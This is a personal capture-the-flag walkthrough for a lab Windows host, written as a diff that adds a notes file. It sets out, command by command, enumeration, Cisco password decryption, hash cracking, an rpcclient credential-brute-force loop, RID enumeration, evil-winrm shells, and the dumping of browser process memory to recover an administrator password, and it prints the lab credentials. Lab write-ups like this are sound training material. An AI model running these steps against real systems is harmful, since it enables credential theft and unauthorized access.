@@ -1,0 +1,184 @@
+pentest script
+
+	http://10.10.10.149/login.php
+		learned about ?guest=true
+
+	http://10.10.10.149/attachments
+		directory exists, returned 301 (moved to "attachments/" so dirb did not bruteforce
+
+
+OSINT
+
+	Possible OS's for IIS 10
+		Windows 10, Windows 7 Service Pack 1, Windows 8, Windows 8.1, Windows Server 2008 R2, Windows Server 2012, Windows Server 2012 R2
+			https://www.microsoft.com/en-us/download/details.aspx?id=48264
+
+dirb
+
+	looking for log files
+		dirb http://10.10.10.149/attachments/ /usr/share/dirb/wordlists/big.txt -X ".txt,.log, " (becuase exposed log files are realistic)
+
+	http://10.10.10.149/attachments/config.txt
+		a quick google search of "service password-encryption" brings up a lot of CISCO stuff and references CISCO IOS, which is used in routers and switches
+		further down in the config file is "router bgp 100", definitely a router config file
+
+		usernames:passwords
+			rout3r:0242114B0E143F015F5D1E161713
+			admin:02375012182C1A1D751618034F36415408
+		
+			a google search for "cisco router config file passwords" yields [this website](https://www.cisco.com/en/US/products/sw/iosswrel/ps1831/products_configuration_guide_chapter09186a0080347975.html) which reveals that "password 7" means it was encrypted with some cisco specific dofware
+
+			https://github.com/theevilbit/ciscot7)
+				Used this tool to decrypt the passwords
+					python ciscot7.py -f config.txt
+						rout3r:$uperP@ssword
+						admin:Q4)sJu\Y8qz*A3?d
+
+SMB is running
+	tried using msf to bruteforce, no dice
+
+winrm is running
+	same
+
+back to enum
+	dirb shows an issue page but it is blank
+	dirb also shows a login page that allows guest login, let's grab session cookie
+		curl -I http://10.10.10.149/login.php?guest=true
+			Set-Cookie: PHPSESSID=pp36invteXXXXXXaq9sqf18jh0v; path=/
+	now let's read the issues page
+		curl -b "PHPSESSID=pp36invteXXXXXXaq9sqf18jh0v" "http://10.10.10.149/issues.php" | less
+
+		enumerated hazard and support admin (along with variants to be sure) as users
+		current user list
+			rout3r
+			admin
+			Hazard
+			hazard
+			"support admin"
+			support
+			"Support Admin"
+			Support
+			Admin
+
+
+tried bruteforcing rpc, no avail
+	for i in $(cat users.txt); do for j in $(cat pass.txt); do echo $i%$j && rpcclient -U "$i%$j" 10.10.10.149 && sleep 1; done; done;
+
+going back to enum
+
+I missed a md5 in the config file
+	$1$pdQG$o8nrSzsGXeaduXrjlvKc91
+
+hashcat help confirms it is a md5 for cisco
+
+threw rockyou at it w/ hashcat, no rules
+	stealth1agent
+
+updating password list
+	$uperP@ssword
+	Q4)sJu\Y8qz*A3?d
+	stealth1agent
+
+bruteforcing rpc again
+	for i in $(cat users.txt); do for j in $(cat pass.txt); do echo $i%$j && rpcclient -U "$i%$j" 10.10.10.149 && sleep 1; done; done;
+	hazard:stealth1agent is a valid cred pair
+	
+enuming shares to determine privilege
+	crackmapexec -u users.txt -p pass.txt --shares 10.10.10.149
+	
+	definitely not privileged
+		CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\Hazard:stealth1agent 
+		CME          10.10.10.149:445 SUPPORTDESK     [+] Enumerating shares
+		CME          10.10.10.149:445 SUPPORTDESK     SHARE           Permissions
+		CME          10.10.10.149:445 SUPPORTDESK     -----           -----------
+		CME          10.10.10.149:445 SUPPORTDESK     ADMIN$          NO ACCESS
+		CME          10.10.10.149:445 SUPPORTDESK     IPC$            READ
+		CME          10.10.10.149:445 SUPPORTDESK     C$              NO ACCESS
+
+tried multiple ways of getting a shell, not working, back to enumeration
+	first method - https://github.com/byt3bl33d3r/CrackMapExec/wiki/Getting-Shells-101 (not admin)
+	second method - https://www.redspin.com/it-security-blog/2011/03/get-a-meterpreter-shell-using-smb-credentials-2/) (not valid creds)
+	third method - https://github.com/Hackplayers/evil-winrm/blob/master/README.md (not valid creds)
+
+in looking up different enum methods and reading the ones listed in crackmapexecs help, i came across sids, trying to figure out how to enum them with rpcclient since msf and cme do not seem to do the job
+
+	rpcclient -U 'hazard%stealth1agent' 10.10.10.149
+	
+	well would you look at that, press ? in the client and at the bottom it shows how to lookup sids
+	mine (hazard's) is 1008, going up
+	chase is at 1012
+	jason is at 1013
+	went up to 1020
+	updating users.txt, just realized windows does not seem to be case sensitive with usernames
+		rout3r
+		admin
+		hazard
+		support admin
+		support
+		chase
+		jason
+
+verified chase has the password Q4)sJu\Y8qz*A3?d with rpcclient
+	for i in $(cat users.txt); do for j in $(cat pass.txt); do echo $i%$j && rpcclient -U "$i%$j" 10.10.10.149 && sleep 1; done; done;	
+
+GOT A SHELL
+	evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
+
+user.txt is on chase's desktop
+let's see what processes are running
+	MsMpEng
+	ProcessNameSI
+	Registry
+	RuntimeBroker
+	SearchUI
+	ShellExperienceHost
+	System
+	VGAuthService
+	WmiPrvSE
+	csrss
+	ctfmon
+	dllhost
+	dllhost1
+	dwm
+	explorer (why? this is a server)
+	firefox1 (same)
+	fontdrvhost
+	lsass
+	msdtc
+	services
+	sihost
+	smss
+	spoolsv
+	svchost
+	taskhostw
+	vmtoolsd
+	wininit
+	winlogon
+	wsmprovhost0
+
+I just recalled, this is running a webserver, can I write to it?
+	no, i can't, back to the processes
+
+Cannot seem to use Invoke-Binary in evil-winrm so I cannot execute a non-native command (external program)
+But, I can upload a program and run ./program
+
+Tried Windows privesc by pentest monkey, no dice
+
+Can I see what the browsers are doing?
+	https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
+
+dumped all firefox processes
+	./procdump64.exe -ma [ID]
+
+found the following string in memory
+	localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+
+adding the follwoing to the passwords
+	4dD!5}x/re8]FBuZ
+
+logged into the webserver as admin with those creds!
+
+got admin shell!
+	evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'
+
+submitted flag (on admin's desktop)
